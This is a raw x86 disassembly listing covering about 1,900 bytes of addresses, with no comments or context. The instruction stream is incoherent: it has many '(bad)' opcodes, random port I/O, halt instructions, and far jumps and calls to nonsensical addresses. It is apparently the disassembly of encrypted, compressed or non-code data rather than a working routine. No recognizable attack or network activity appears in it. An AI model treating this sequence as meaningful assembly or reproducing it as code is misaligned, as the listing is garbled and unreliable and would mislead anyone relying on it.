  41f413:	sub    DWORD PTR [ecx],ebp
  41f415:	cmp    al,0x12
  41f417:	jns    0x41f413
  41f419:	in     al,0xea
  41f41b:	sub    eax,0x60955db
  41f420:	idiv   BYTE PTR [eax]
  41f422:	fistp  QWORD PTR [esi+eax*2+0x25]
  41f426:	and    DWORD PTR [ebp+0x7],ebp
  41f429:	in     eax,0xcb
  41f42b:	xchg   edx,eax
  41f42c:	add    BYTE PTR [eax],dl
  41f42e:	in     eax,0xc1
  41f430:	fwait
  41f431:	jle    0x41f400
  41f433:	lods   eax,DWORD PTR ds:[esi]
  41f434:	out    0x1a,al
  41f436:	add    dh,dl
  41f438:	mov    bh,0x61
  41f43a:	xchg   ecx,eax
  41f43b:	(bad)  
  41f43c:	mov    bl,0xd6
  41f43e:	mov    ds:0x7c3d266b,al
  41f443:	ins    BYTE PTR es:[edi],dx
  41f444:	pop    ebx
  41f445:	lods   eax,DWORD PTR ds:[esi]
  41f446:	pop    eax
  41f447:	sub    eax,0x113d2591
  41f44c:	test   eax,0xe7d0949d
  41f451:	push   es
  41f452:	dec    ebp
  41f453:	push   ecx
  41f454:	inc    esp
  41f455:	bound  edx,QWORD PTR [ecx]
  41f457:	ss push cs
  41f459:	sub    eax,0xb76789c2
  41f45e:	pop    ecx
  41f45f:	and    ch,BYTE PTR [edi-0x4230e3a4]
  41f465:	repnz mov esp,0xe7c5a920
  41f46b:	xchg   ecx,eax
  41f46c:	sub    esi,DWORD PTR [esi+0x13]
  41f46f:	jno    0x41f412
  41f471:	and    BYTE PTR [edi-0x7a],dl
  41f474:	sbb    al,0xa4
  41f476:	in     al,dx
  41f477:	cmp    ah,0xda
  41f47a:	push   0x9b5321dc
  41f47f:	cdq    
  41f480:	xchg   edx,eax
  41f481:	xor    al,BYTE PTR [ebp+eiz*1+0x50]
  41f485:	gs mov eax,0x36d27d78
  41f48b:	pop    ss
  41f48c:	xor    cl,BYTE PTR [ebx]
  41f48e:	inc    esi
  41f48f:	mov    dh,0x57
  41f491:	mov    bh,BYTE PTR [ebp-0xd35d5a]
  41f497:	nop
  41f498:	lds    ebp,FWORD PTR [ebp+0x2abb8073]
  41f49e:	scas   eax,DWORD PTR es:[edi]
  41f49f:	in     eax,dx
  41f4a0:	lahf   
  41f4a1:	mov    eax,ds:0xacabdd1c
  41f4a6:	arpl   WORD PTR [esi],dx
  41f4a8:	out    dx,al
  41f4a9:	stos   BYTE PTR es:[edi],al
  41f4aa:	mov    bl,0x2c
  41f4ac:	imul   ecx,DWORD PTR [ecx-0x36],0xfffffff0
  41f4b0:	int3   
  41f4b1:	mov    BYTE PTR [ebp+ebp*4+0x20d778c2],ch
  41f4b8:	jno    0x41f538
  41f4ba:	ds add al,0xa5
  41f4bd:	lds    edx,FWORD PTR [esp+ebp*2-0x35]
  41f4c1:	out    dx,eax
  41f4c2:	add    esi,esi
  41f4c4:	jae    0x41f4ad
  41f4c6:	cs push ebx
  41f4c8:	rcr    BYTE PTR [esi+0x59],0x61
  41f4cc:	scas   eax,DWORD PTR es:[edi]
  41f4cd:	loop   0x41f540
  41f4cf:	mov    ah,0x86
  41f4d1:	aaa    
  41f4d2:	int    0x91
  41f4d4:	sub    esi,DWORD PTR [esi+0x7de75a7c]
  41f4da:	ret    
  41f4db:	xchg   esp,eax
  41f4dc:	(bad)  
  41f4de:	out    dx,al
  41f4df:	dec    esi
  41f4e0:	jecxz  0x41f553
  41f4e2:	xlat   BYTE PTR ds:[ebx]
  41f4e3:	nop
  41f4e4:	mov    edi,0x79a7245e
  41f4e9:	sub    al,ch
  41f4eb:	push   esi
  41f4ec:	test   BYTE PTR [ebp+0x2caee21b],ah
  41f4f2:	sbb    ebp,esp
  41f4f4:	push   0xffffffc9
  41f4f6:	mov    esp,cs
  41f4f8:	cmp    esp,DWORD PTR [eax]
  41f4fa:	mov    ecx,0x1a626c61
  41f4ff:	pop    eax
  41f500:	jecxz  0x41f57f
  41f502:	pop    ebp
  41f503:	out    dx,al
  41f504:	jge    0x41f4f8
  41f506:	jmp    0x203f:0xc28c4979
  41f50d:	sub    ebx,edi
  41f50f:	xchg   esi,eax
  41f510:	jnp    0x41f49d
  41f512:	lods   al,BYTE PTR ds:[esi]
  41f513:	xchg   esp,eax
  41f514:	dec    edx
  41f515:	es aaa 
  41f517:	push   0x5d
  41f519:	hlt    
  41f51a:	rcl    BYTE PTR [edx-0x80],0x71
  41f51e:	lahf   
  41f51f:	frstor [edx+eiz*2]
  41f522:	ins    BYTE PTR es:[edi],dx
  41f523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f524:	pop    esp
  41f525:	lods   eax,DWORD PTR ds:[esi]
  41f526:	(bad)  
  41f528:	loopne 0x41f580
  41f52a:	mov    ah,0xf2
  41f52c:	xchg   edi,eax
  41f52d:	outs   dx,BYTE PTR ds:[esi]
  41f52e:	call   0x69cb:0x566a87af
  41f535:	push   esi
  41f536:	call   0x1405c057
  41f53b:	lods   al,BYTE PTR ds:[esi]
  41f53c:	jae    0x41f560
  41f53e:	pop    ss
  41f53f:	mov    esp,0xa762c7c3
  41f544:	and    al,0x8b
  41f546:	and    bl,BYTE PTR [ebp+0x2b24cf62]
  41f54c:	xor    edi,ecx
  41f54e:	mov    ds:0x501b87a3,al
  41f553:	pop    eax
  41f554:	cwde   
  41f555:	pushf  
  41f556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f557:	addr16 sub cl,ah
  41f55a:	inc    esp
  41f55b:	sub    ecx,DWORD PTR [esi-0x4a]
  41f55e:	inc    ebp
  41f55f:	xchg   esi,eax
  41f560:	inc    edi
  41f561:	mov    bh,0xbc
  41f563:	not    BYTE PTR [ebx-0xd3ecbc4]
  41f569:	jp     0x41f502
  41f56b:	ins    DWORD PTR es:[edi],dx
  41f56c:	jge    0x41f555
  41f56e:	dec    ecx
  41f56f:	inc    edx
  41f570:	and    DWORD PTR [ebp+0x23806632],edx
  41f576:	jns    0x41f554
  41f578:	imul   esi,esp,0x63
  41f57b:	push   esi
  41f57c:	push   eax
  41f57d:	xchg   edx,eax
  41f57e:	aam    0x22
  41f580:	push   0xffffffbf
  41f582:	and    BYTE PTR [eax+0x35],dl
  41f585:	gs cli 
  41f587:	leave  
  41f588:	dec    ebx
  41f589:	outs   dx,DWORD PTR ds:[esi]
  41f58a:	hlt    
  41f58b:	push   edi
  41f58c:	or     dh,dh
  41f58e:	imul   ch
  41f590:	call   0xc0c42dd0
  41f595:	ja     0x41f5b2
  41f597:	or     eax,0x6cc979d1
  41f59c:	fisub  WORD PTR [esp+ebx*1-0x3df2e0a9]
  41f5a3:	data16 (bad) 
  41f5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5a6:	dec    esi
  41f5a7:	cs push edx
  41f5a9:	add    esi,DWORD PTR [ebp+0x22]
  41f5ac:	mov    dh,0x60
  41f5ae:	add    al,0x78
  41f5b0:	out    dx,eax
  41f5b1:	and    esp,DWORD PTR [esi+0x75]
  41f5b4:	dec    edi
  41f5b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b6:	in     al,dx
  41f5b7:	mov    edx,0x40c0b9a1
  41f5bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5bd:	cs push ss
  41f5bf:	dec    esp
  41f5c0:	mov    cl,0xf3
  41f5c2:	jno    0x41f63a
  41f5c4:	fisttp QWORD PTR [esi-0x1d519c2b]
  41f5ca:	adc    dh,0x2f
  41f5cd:	cmp    eax,0xf603b9c7
  41f5d2:	pop    ss
  41f5d3:	push   edi
  41f5d4:	jecxz  0x41f5bd
  41f5d6:	(bad)  
  41f5d7:	les    esi,FWORD PTR [eax-0x59]
  41f5da:	lock pop ebp
  41f5dc:	xchg   edx,eax
  41f5dd:	leave  
  41f5de:	xchg   ebx,ebx
  41f5e0:	xor    DWORD PTR [edi+ecx*4+0x2a],0xeb19032d
  41f5e8:	imul   edx,DWORD PTR ds:0x782e499b,0xffffff8a
  41f5ef:	aaa    
  41f5f0:	clc    
  41f5f1:	out    dx,al
  41f5f2:	cmp    bl,ah
  41f5f4:	fwait
  41f5f5:	sub    edi,DWORD PTR [edx]
  41f5f7:	xchg   bh,bl
  41f5f9:	jo     0x41f5f4
  41f5fb:	in     al,dx
  41f5fc:	aas    
  41f5fd:	fnsave [ecx+eiz*2-0x4234cac3]
  41f604:	mov    ecx,0x9ccc77be
  41f609:	push   0x566463c9
  41f60e:	mov    edi,0x90ce4894
  41f613:	ret    0x55cc
  41f616:	fldcw  WORD PTR [esi+ebp*4+0x5fe1418b]
  41f61d:	jle    0x41f65f
  41f61f:	mov    bl,BYTE PTR [esi-0x4dcd364]
  41f625:	pop    ds
  41f626:	arpl   WORD PTR [edi],sp
  41f628:	mov    ecx,0xbbf6543d
  41f62d:	js     0x41f667
  41f62f:	adc    eax,0xe70f5b44
  41f634:	inc    ebp
  41f635:	inc    eax
  41f636:	cld    
  41f637:	xchg   DWORD PTR [esp+ebx*1-0xd],ecx
  41f63b:	cli    
  41f63c:	pop    ebp
  41f63d:	push   eax
  41f63e:	add    eax,DWORD PTR ds:0x80f3188a
  41f644:	retf   0x887c
  41f647:	or     DWORD PTR [esi-0x43f4a601],ebp
  41f64d:	data16 gs arpl si,di
  41f651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f652:	test   BYTE PTR [eax-0x778908d4],ch
  41f658:	nop
  41f659:	not    BYTE PTR [eax-0x41]
  41f65c:	adc    dh,BYTE PTR [eax+0x1002bec3]
  41f662:	adc    ebp,DWORD PTR [ebx+0x6d47cedb]
  41f668:	aaa    
  41f669:	clc    
  41f66a:	(bad)  
  41f66c:	push   cs
  41f66d:	shr    DWORD PTR [eax],1
  41f66f:	mov    ebx,0x931956ef
  41f674:	pop    ecx
  41f675:	imul   esi,DWORD PTR [edi+0x3],0x356c8505
  41f67c:	outs   dx,DWORD PTR ds:[esi]
  41f67d:	addr16 in al,0x5e
  41f680:	mov    ebx,0xaa3ba8ed
  41f685:	mov    eax,ds:0x4c62e9fc
  41f68a:	adc    edx,DWORD PTR [esp+ebx*8]
  41f68d:	iret   
  41f68e:	or     edi,DWORD PTR [ecx]
  41f690:	xor    al,0x6b
  41f692:	test   BYTE PTR [ecx+esi*4+0x68],ch
  41f696:	inc    esi
  41f697:	mov    edx,0x5fb7f9c0
  41f69c:	jne    0x41f6e8
  41f69e:	(bad)  
  41f69f:	sbb    edi,edx
  41f6a1:	(bad)  
  41f6a2:	mov    al,ds:0xab5e3583
  41f6a7:	sbb    al,0xe4
  41f6a9:	sub    ebp,DWORD PTR [esi+ebx*8-0x4e]
  41f6ad:	inc    ebp
  41f6ae:	data16 lods al,BYTE PTR ds:[esi]
  41f6b0:	sbb    BYTE PTR [esi-0x12],0xe7
  41f6b4:	xchg   edx,eax
  41f6b5:	push   ss
  41f6b6:	mov    al,0x7e
  41f6b8:	sbb    bl,cl
  41f6ba:	ja     0x41f67c
  41f6bc:	es rol al,0xd1
  41f6c0:	jecxz  0x41f725
  41f6c2:	addr16 cmp al,0x6e
  41f6c5:	cwde   
  41f6c6:	mov    bl,0xdb
  41f6c8:	adc    BYTE PTR [ecx+ecx*1],dh
  41f6cb:	sub    al,0x59
  41f6cd:	pop    esi
  41f6ce:	or     DWORD PTR [esi+0x51],0x15
  41f6d2:	mov    ebx,0xc016b7d7
  41f6d7:	mov    esi,esp
  41f6d9:	aad    0xbe
  41f6db:	cmp    DWORD PTR [ecx+0x71a46a81],ebx
  41f6e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e2:	mov    bl,0x38
  41f6e4:	inc    ebp
  41f6e5:	mov    ebp,0xe3314697
  41f6ea:	ret    
  41f6eb:	sbb    al,0x33
  41f6ed:	pop    esp
  41f6ee:	or     edi,eax
  41f6f0:	jmp    0xee8b548c
  41f6f5:	aas    
  41f6f6:	in     al,0xed
  41f6f8:	mov    esi,0xf954cbf4
  41f6fd:	push   esi
  41f6fe:	xchg   ebx,eax
  41f6ff:	loope  0x41f6b8
  41f701:	mov    DWORD PTR [ecx+eiz*1],edi
  41f704:	sbb    ch,ch
  41f706:	leave  
  41f707:	jbe    0x41f786
  41f709:	test   al,0xca
  41f70b:	call   0x18331d7
  41f710:	cmp    BYTE PTR [ebp-0x6d8496b4],0x58
  41f717:	mov    ah,0x8a
  41f719:	(bad)  [esi+0x17]
  41f71c:	jns    0x41f702
  41f71e:	cld    
  41f71f:	scas   eax,DWORD PTR es:[edi]
  41f720:	xor    al,BYTE PTR [ecx-0x64ba3cc9]
  41f726:	not    BYTE PTR [edi]
  41f728:	jge    0x41f7a5
  41f72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f72b:	jbe    0x41f712
  41f72d:	xor    DWORD PTR [edi-0x71],esp
  41f730:	xor    DWORD PTR [eax-0x512a5525],0xae0f3a1e
  41f73a:	lods   ax,WORD PTR ds:[esi]
  41f73c:	mov    dh,BYTE PTR [ecx-0x54d415ca]
  41f742:	push   ecx
  41f743:	mov    ah,0x7c
  41f745:	(bad)  
  41f746:	mov    ch,0x3d
  41f748:	xchg   DWORD PTR [esp+eax*8-0x3cea1c0d],ebp
  41f74f:	out    dx,al
  41f750:	xchg   ebp,eax
  41f751:	mov    DWORD PTR [edi-0x76],ebx
  41f754:	cmc    
  41f755:	div    ah
  41f757:	jge    0x41f753
  41f759:	sar    BYTE PTR [edx+0x8281109],0xdc
  41f760:	imul   ecx,DWORD PTR [ecx+0x49],0xffffffec
  41f764:	adc    BYTE PTR ds:0x99f68834,al
  41f76a:	jo     0x41f700
  41f76c:	stos   BYTE PTR es:[edi],al
  41f76d:	or     al,0xe6
  41f76f:	add    al,0x68
  41f771:	or     ah,BYTE PTR [eax+0x4b1ac261]
  41f777:	jb     0x41f7aa
  41f779:	push   esi
  41f77a:	mov    ah,0x7b
  41f77c:	mov    bl,cl
  41f77e:	pop    edi
  41f77f:	mov    ebp,0xbc80f680
  41f784:	ins    DWORD PTR es:[edi],dx
  41f785:	ret    
  41f786:	cmp    eax,0xa0d5e8d8
  41f78b:	into   
  41f78c:	jg     0x41f756
  41f78e:	dec    esp
  41f78f:	inc    esp
  41f790:	cmc    
  41f791:	and    edx,DWORD PTR [eax+ebp*2]
  41f794:	loop   0x41f734
  41f796:	lahf   
  41f797:	adc    dh,BYTE PTR [edx]
  41f799:	mov    fs,WORD PTR [ebx+0x1d]
  41f79c:	arpl   WORD PTR [ebp+0x9],sp
  41f79f:	and    DWORD PTR [ebp+eax*1+0xd],ecx
  41f7a3:	retf   0x7c9f
  41f7a6:	mov    ecx,0xdeeca21d
  41f7ab:	xchg   edi,eax
  41f7ac:	sub    edx,0xffffffeb
  41f7af:	repz call 0xc1555d86
  41f7b5:	scas   eax,DWORD PTR es:[edi]
  41f7b6:	dec    edx
  41f7b7:	mov    ds:0x2984d681,eax
  41f7bc:	xor    BYTE PTR [edi+0x6],al
  41f7bf:	ss pop esp
  41f7c1:	cmp    ch,BYTE PTR ds:0x548ae3cc
  41f7c7:	shr    esp,cl
  41f7c9:	push   edx
  41f7ca:	and    eax,0xf54ee2f6
  41f7cf:	das    
  41f7d0:	or     bh,BYTE PTR [ebp+edx*1-0x29]
  41f7d4:	push   cs
  41f7d5:	into   
  41f7d6:	mov    ah,0xb8
  41f7d8:	test   DWORD PTR [ecx+0x23],esp
  41f7db:	call   0xb3d04d93
  41f7e0:	(bad)  
  41f7e1:	mov    edx,0x63f52765
  41f7e6:	jl     0x41f83b
  41f7e8:	(bad)  
  41f7e9:	(bad)  
  41f7ea:	ds mov ebp,0xe1e2909c
  41f7f0:	mov    cl,0x97
  41f7f2:	repnz enter 0xe16d,0x41
  41f7f7:	scas   eax,DWORD PTR es:[edi]
  41f7f8:	fwait
  41f7f9:	xchg   edx,eax
  41f7fa:	aas    
  41f7fb:	dec    eax
  41f7fc:	add    DWORD PTR [edx],ebp
  41f7fe:	inc    edi
  41f7ff:	gs jp  0x41f7b3
  41f802:	push   esi
  41f803:	cmc    
  41f804:	xor    al,0x9b
  41f806:	dec    ebp
  41f807:	jne    0x41f7d9
  41f809:	mov    dh,0xaf
  41f80b:	sub    ebp,DWORD PTR [ecx+ebp*1]
  41f80e:	add    ecx,DWORD PTR [esp+ebx*8]
  41f811:	test   BYTE PTR [ecx-0x22],bl
  41f814:	jl     0x41f79d
  41f816:	gs ror edx,cl
  41f819:	mov    cl,0xe5
  41f81b:	sub    al,0xe5
  41f81d:	pop    edi
  41f81e:	push   cs
  41f81f:	repz not bl
  41f822:	or     al,0xd0
  41f824:	mov    esp,0x4cc0b048
  41f829:	push   0xffffffce
  41f82b:	sbb    al,0xc6
  41f82d:	ins    DWORD PTR es:[edi],dx
  41f82e:	sahf   
  41f82f:	pop    edi
  41f830:	xchg   DWORD PTR [edx+0x686c37b4],esi
  41f836:	popf   
  41f837:	lahf   
  41f838:	test   al,0xa3
  41f83a:	cmp    bl,BYTE PTR [esi-0x79ef2d3c]
  41f840:	sbb    ebx,edi
  41f842:	jge    0x41f840
  41f844:	dec    ecx
  41f845:	(bad)  
  41f846:	hlt    
  41f847:	je     0x41f8c2
  41f849:	arpl   WORD PTR [edx],dx
  41f84b:	cli    
  41f84c:	mov    ebx,0xbe830aab
  41f851:	pop    esi
  41f852:	ror    BYTE PTR [edx-0x2a],cl
  41f855:	cs adc esp,ebp
  41f858:	shl    BYTE PTR [edi+0x77bde516],cl
  41f85e:	es ret 0x68dd
  41f862:	xchg   bh,dl
  41f864:	push   ss
  41f865:	cwde   
  41f866:	enter  0x13ce,0xef
  41f86a:	cdq    
  41f86b:	std    
  41f86c:	(bad)  
  41f86d:	pop    ds
  41f86e:	push   esp
  41f86f:	mov    ch,0xdc
  41f871:	daa    
  41f872:	sub    edx,DWORD PTR [esi+eiz*4]
  41f875:	addr16 and edi,esi
  41f878:	out    0x53,al
  41f87a:	jnp    0x41f8ea
  41f87c:	cld    
  41f87d:	jle    0x41f87b
  41f87f:	xchg   edx,eax
  41f880:	dec    esp
  41f881:	sar    BYTE PTR [eax-0x6ceee301],cl
  41f887:	or     al,0x6d
  41f889:	or     eax,0x5e5a8179
  41f88e:	pop    edx
  41f88f:	(bad)  
  41f891:	popa   
  41f892:	push   es
  41f893:	xchg   ebx,eax
  41f894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f895:	retf   0x9767
  41f898:	xor    DWORD PTR [ecx+ebp*4],0x92c4037f
  41f89f:	punpckhbw mm4,QWORD PTR [ebp+0x1167515d]
  41f8a6:	mov    esp,0x34dea14f
  41f8ab:	aas    
  41f8ac:	xchg   bl,dh
  41f8ae:	push   es
  41f8af:	fistp  WORD PTR [edx+0x7e9a6be4]
  41f8b5:	stc    
  41f8b6:	lahf   
  41f8b7:	sbb    al,0x66
  41f8b9:	sbb    DWORD PTR [edx+eiz*8-0x3f],edi
  41f8bd:	pop    edi
  41f8be:	add    al,0x54
  41f8c0:	or     al,dh
  41f8c2:	jb     0x41f8b7
  41f8c4:	push   0x536539e0
  41f8c9:	(bad)  
  41f8cb:	out    dx,al
  41f8cc:	stos   BYTE PTR es:[edi],al
  41f8cd:	aad    0x9e
  41f8cf:	push   edx
  41f8d0:	lahf   
  41f8d1:	pop    eax
  41f8d2:	out    dx,eax
  41f8d3:	int3   
  41f8d4:	cmp    ebp,DWORD PTR [ecx+0x7c380df6]
  41f8da:	and    BYTE PTR [ebx],dh
  41f8dc:	dec    ecx
  41f8dd:	stos   BYTE PTR es:[di],al
  41f8df:	bound  ecx,QWORD PTR [edi+0x2bf28e60]
  41f8e5:	inc    ebp
  41f8e6:	repz pop ebx
  41f8e8:	mov    ss,esp
  41f8ea:	adc    DWORD PTR [edi+0x50],0xb6c1704
  41f8f1:	push   ecx
  41f8f2:	sub    al,0x1f
  41f8f4:	mov    dh,0x6e
  41f8f6:	(bad)  
  41f8f7:	jmp    FWORD PTR [esi]
  41f8f9:	and    dl,BYTE PTR [ebp-0x43]
  41f8fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8fd:	cmp    al,0x8c
  41f8ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f900:	push   sp
  41f902:	xor    eax,0xfc8c91e6
  41f907:	cmp    al,0xc8
  41f909:	fwait
  41f90a:	hlt    
  41f90b:	dec    BYTE PTR [ecx]
  41f90d:	push   ebx
  41f90e:	popa   
  41f90f:	push   es
  41f910:	mov    eax,0x687f2d3d
  41f915:	or     eax,0x9fa100cf
  41f91a:	mov    cl,0x83
  41f91c:	mov    esi,0xb0af62f4
  41f921:	sub    ecx,DWORD PTR [ecx]
  41f923:	sbb    BYTE PTR [ecx+0x2c],bh
  41f926:	xchg   esi,eax
  41f927:	mov    BYTE PTR [eax],dh
  41f929:	mov    DWORD PTR [edi+0x18],esp
  41f92c:	loope  0x41f8cd
  41f92e:	pop    edx
  41f92f:	gs cmp al,0xbc
  41f932:	je     0x41f910
  41f934:	mov    WORD PTR [esi],cs
  41f936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f937:	pop    ecx
  41f938:	mov    BYTE PTR [edi+0x17],al
  41f93b:	mov    al,ds:0x59449fb2
  41f940:	inc    esi
  41f941:	ror    BYTE PTR [eax],cl
  41f943:	xor    DWORD PTR [ebx],ebp
  41f945:	adc    esp,esp
  41f947:	jmp    0x66fb90cd
  41f94c:	push   edx
  41f94d:	push   esi
  41f94e:	pop    ebp
  41f94f:	jge    0x41f976
  41f951:	add    al,0x84
  41f953:	push   ds
  41f954:	fwait
  41f955:	sub    esp,eax
  41f957:	adc    BYTE PTR [esi-0x6af4429b],0x7c
  41f95e:	lahf   
  41f95f:	dec    esp
  41f960:	xchg   esi,eax
  41f961:	pop    ss
  41f962:	fcmovbe st,st(4)
  41f964:	je     0x41f953
  41f966:	push   edx
  41f967:	inc    edi
  41f968:	or     al,0xb0
  41f96a:	pusha  
  41f96b:	sub    eax,0x769f0521
  41f970:	sbb    esi,DWORD PTR [edx-0x60053489]
  41f976:	pop    es
  41f977:	or     ecx,esi
  41f979:	jne    0x41f986
  41f97b:	add    edx,ebx
  41f97d:	sbb    dh,cl
  41f97f:	sub    esi,DWORD PTR [edx]
  41f981:	ins    DWORD PTR es:[edi],dx
  41f982:	es pop ecx
  41f984:	xchg   bh,cl
  41f986:	push   es
  41f987:	and    edi,DWORD PTR [edi-0x67196b68]
  41f98d:	(bad)  
  41f98e:	in     al,dx
  41f98f:	adc    esp,DWORD PTR [edi+0x2e]
  41f992:	sub    al,0x99
  41f994:	shufps xmm0,xmm6,0xb3
  41f998:	pop    esi
  41f999:	sbb    BYTE PTR [ebx-0x48],0x40
  41f99d:	mov    BYTE PTR ds:0x47190279,ch
  41f9a3:	or     al,dl
  41f9a5:	xchg   DWORD PTR [eax-0x53],edx
  41f9a8:	xchg   edx,eax
  41f9a9:	adc    al,0x8f
  41f9ab:	and    bl,BYTE PTR [esi+0x6]
  41f9ae:	jp     0x41f93d
  41f9b0:	jg     0x41fa1d
  41f9b2:	scas   al,BYTE PTR es:[edi]
  41f9b3:	hlt    
  41f9b4:	fwait
  41f9b5:	adc    DWORD PTR [eax+0x4],edx
  41f9b8:	iret   
  41f9b9:	(bad)  
  41f9ba:	retf   0xdc67
  41f9bd:	loop   0x41f9eb
  41f9bf:	dec    eax
  41f9c0:	push   ds
  41f9c1:	aaa    
  41f9c2:	inc    esi
  41f9c3:	(bad)  
  41f9c4:	cwde   
  41f9c5:	enter  0x72bb,0xd2
  41f9c9:	mov    al,0xe0
  41f9cb:	loope  0x41f9a8
  41f9cd:	dec    ebx
  41f9ce:	pop    ds
  41f9cf:	mov    ebp,0xa8be3af0
  41f9d4:	push   edx
  41f9d5:	pop    edi
  41f9d6:	fwait
  41f9d7:	clc    
  41f9d8:	sub    eax,0xfd443138
  41f9dd:	ror    DWORD PTR [ebx+0x38],cl
  41f9e0:	add    ebp,DWORD PTR [edx+0x7b]
  41f9e3:	aam    0x93
  41f9e5:	jns    0x41f9b4
  41f9e7:	and    esp,DWORD PTR [ebp-0x7f629fcf]
  41f9ed:	fcmove st,st(2)
  41f9ef:	test   BYTE PTR [edx+0x1d],0xe8
  41f9f3:	and    eax,0x7745c231
  41f9f8:	outs   dx,BYTE PTR ds:[esi]
  41f9f9:	shl    DWORD PTR ds:0x5349a3cf,cl
  41f9ff:	enter  0xee4c,0x74
  41fa03:	cmc    
  41fa04:	rcl    BYTE PTR ds:0x2fce45d4,cl
  41fa0a:	mov    edi,0xe1e3bd9a
  41fa0f:	mov    cl,0xe
  41fa11:	popa   
  41fa12:	fcom   QWORD PTR [ecx-0x4c52da9f]
  41fa18:	rcl    BYTE PTR [ecx],cl
  41fa1a:	push   edx
  41fa1b:	sbb    bh,BYTE PTR [eax]
  41fa1d:	mov    ch,BYTE PTR [esi]
  41fa1f:	das    
  41fa20:	push   0xffffffc9
  41fa22:	pop    ebp
  41fa23:	mov    ds:0x568d4cea,al
  41fa28:	sbb    al,0x75
  41fa2a:	icebp  
  41fa2b:	sub    al,0x2e
  41fa2d:	xor    al,0xc9
  41fa2f:	jl     0x41faa7
  41fa31:	push   es
  41fa32:	push   ebp
  41fa33:	retf   
  41fa34:	(bad)
  41fa37:	pop    esp
  41fa38:	mov    edx,DWORD PTR [eax]
  41fa3a:	les    eax,FWORD PTR [ecx+0x52]
  41fa3d:	iret   
  41fa3e:	inc    ecx
  41fa3f:	xchg   ebp,eax
  41fa40:	lea    ecx,[edi-0x18379516]
  41fa46:	lock stos BYTE PTR es:[edi],al
  41fa48:	dec    ecx
  41fa49:	ror    eax,1
  41fa4b:	jbe    0x41fa73
  41fa4d:	cmc    
  41fa4e:	sbb    dh,ch
  41fa50:	pusha  
  41fa51:	push   esi
  41fa52:	dec    ebx
  41fa53:	sub    ch,BYTE PTR [ecx-0x21910a86]
  41fa59:	adc    BYTE PTR [esi-0x52],0x49
  41fa5d:	in     eax,0xb8
  41fa5f:	push   es
  41fa60:	or     eax,0x57dad8e0
  41fa65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa66:	pop    esp
  41fa67:	sub    BYTE PTR [ecx+0x1d],bh
  41fa6a:	mov    esi,0x984012f2
  41fa6f:	jmp    0x494f8958
  41fa74:	xor    DWORD PTR [ebx+0x3b2dffc2],esp
  41fa7a:	cmp    dl,BYTE PTR [eax+0x5e6b117f]
  41fa80:	inc    edi
  41fa81:	xor    dl,dh
  41fa83:	retf   0x91fc
  41fa86:	loop   0x41fa97
  41fa88:	loope  0x41fa76
  41fa8a:	add    al,0x69
  41fa8c:	(bad)  
  41fa8d:	fld    DWORD PTR [ecx+0x36dc439b]
  41fa93:	pop    ds
  41fa94:	int3   
  41fa95:	and    ch,BYTE PTR [edx+0x78ba90fc]
  41fa9b:	dec    ebx
  41fa9c:	jle    0x41fb07
  41fa9e:	and    ebp,edi
  41faa0:	test   DWORD PTR [ecx-0x3cc9f76b],edx
  41faa6:	jno    0x41faf9
  41faa8:	in     eax,0xe4
  41faaa:	dec    eax
  41faab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faac:	test   BYTE PTR [edi-0x62],0xb2
  41fab0:	add    ch,BYTE PTR [ebx+ecx*8]
  41fab3:	mov    ds:0x271bcc32,al
  41fab8:	xchg   esi,eax
  41fab9:	jp     0x41fa89
  41fabb:	les    ebx,FWORD PTR [edx]
  41fabd:	ret    0x4f0
  41fac0:	inc    eax
  41fac1:	xor    esp,eax
  41fac3:	sub    ebp,0xffffffbb
  41fac6:	pop    edx
  41fac7:	push   edx
  41fac8:	dec    esi
  41fac9:	rol    BYTE PTR [edx-0x73],0xde
  41facd:	inc    edi
  41face:	outs   dx,BYTE PTR ds:[esi]
  41facf:	pop    edi
  41fad0:	repz ret 0x82a5
  41fad4:	pusha  
  41fad5:	arpl   WORD PTR [esi-0x196f3336],bp
  41fadb:	xchg   edi,eax
  41fadd:	cli    
  41fade:	adc    eax,0x21723126
  41fae3:	mov    esi,0x4bda8db6
  41fae8:	pop    esp
  41fae9:	loopne 0x41fb51
  41faeb:	sbb    BYTE PTR [eax+ebx*2+0x1e],ah
  41faef:	sub    dh,dl
  41faf1:	xchg   esp,eax
  41faf2:	jb     0x41fb31
  41faf4:	mov    edi,0xee992725
  41faf9:	shl    DWORD PTR [edi-0x1d447c14],0x61
  41fb00:	sbb    BYTE PTR [edx],dl
  41fb02:	fdiv   QWORD PTR ds:0xd954bf78
  41fb08:	mov    esp,0x3a3938a1
  41fb0d:	cmp    al,BYTE PTR [edx+0x2ef7bb87]
  41fb13:	in     eax,dx
  41fb14:	loope  0x41fb85
  41fb16:	enter  0xd56f,0x59
  41fb1a:	std    
  41fb1b:	fcomp  st(1)
  41fb1d:	adc    BYTE PTR [esi-0x28],bh
  41fb20:	retf   0x1352
  41fb23:	mov    esi,0x46a63c96
  41fb28:	sbb    dh,dl
  41fb2a:	call   0x13883919
  41fb2f:	dec    eax
  41fb30:	jg     0x41facf
  41fb32:	jecxz  0x41fb6a
  41fb34:	pop    esp
  41fb35:	and    BYTE PTR [esi],dl
  41fb37:	inc    edi
  41fb38:	ret    0xe344
  41fb3b:	xchg   esi,eax
  41fb3c:	div    DWORD PTR [edi+eax*1+0xa]
  41fb40:	jl     0x41fb3e
  41fb42:	cwde   
  41fb43:	js     0x41fb45
  41fb45:	test   eax,0x6371221b
  41fb4a:	mov    edx,0xdae8d68d
  41fb4f:	retf   
  41fb50:	xor    eax,0xf8f08272
  41fb55:	stc    
  41fb56:	sub    DWORD PTR [esi-0x46a65700],ebp
  41fb5c:	jbe    0x41fb8a
  41fb5e:	sub    bh,cl
